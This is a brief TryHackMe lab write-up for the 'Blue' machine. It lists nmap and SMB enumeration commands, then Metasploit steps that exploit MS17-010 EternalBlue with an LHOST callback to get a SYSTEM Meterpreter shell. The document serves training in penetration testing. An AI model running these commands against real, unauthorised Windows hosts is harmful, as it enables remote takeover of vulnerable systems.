# 🔵 Blue - Notes

## 📝 Information

* Platform: TryHackMe
* OS: Windows
* Difficulty: Easy
* Main Vulnerability: MS17-010 EternalBlue

---

# 🔎 Enumeration

## Nmap

```bash
nmap -sC -sV -oN scan.txt MACHINE_IP
```

Important ports:

```
135/tcp  MSRPC
139/tcp  NetBIOS
445/tcp  SMB
```

---

# 🔍 SMB Enumeration

Check SMB:

```bash
enum4linux MACHINE_IP
```

or:

```bash
smbclient -L //MACHINE_IP -N
```

Important:

* SMB exposed
* Windows 7 target
* Vulnerable to MS17-010

---

# 💥 Exploitation

Vulnerability:

```
MS17-010 EternalBlue
```

Metasploit module:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

Configuration:

```bash
set RHOSTS MACHINE_IP
set LHOST YOUR_IP
run
```

---

# 🖥️ Post Exploitation

Meterpreter commands:

```bash
sysinfo
getuid
```

Expected:

```
NT AUTHORITY\SYSTEM
```

---

# 🚩 Flags Location

User:

```
C:\Users\Administrator\Desktop\
```

Root:

```
C:\Users\Administrator\Desktop\
```

---

# 🧠 Key Takeaways

* Always enumerate SMB services.
* Check Windows versions.
* Search for known vulnerabilities.
* MS17-010 can provide SYSTEM privileges directly.
* Nmap version detection is essential.
